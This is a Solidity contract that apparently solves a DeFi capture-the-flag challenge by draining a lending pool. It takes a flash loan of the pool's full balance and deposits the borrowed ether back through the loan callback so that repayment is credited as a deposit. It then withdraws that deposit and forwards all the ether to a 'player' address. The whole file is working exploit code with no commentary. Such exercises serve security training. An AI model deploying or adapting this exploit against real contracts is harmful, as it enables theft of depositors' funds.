// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Attack4 {
    IPool private immutable pool;
    address private immutable player;
    uint256 private balance;

    constructor(address _pool, address _player) {
        pool = IPool(_pool);
        player = _player;
    }

    receive() external payable {}

    function attack() external {
        balance = address(pool).balance;
        pool.flashLoan(balance);
        pool.withdraw();
        (bool success, ) = player.call{value: address(this).balance}("");
        require(success, "Eth transfer failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
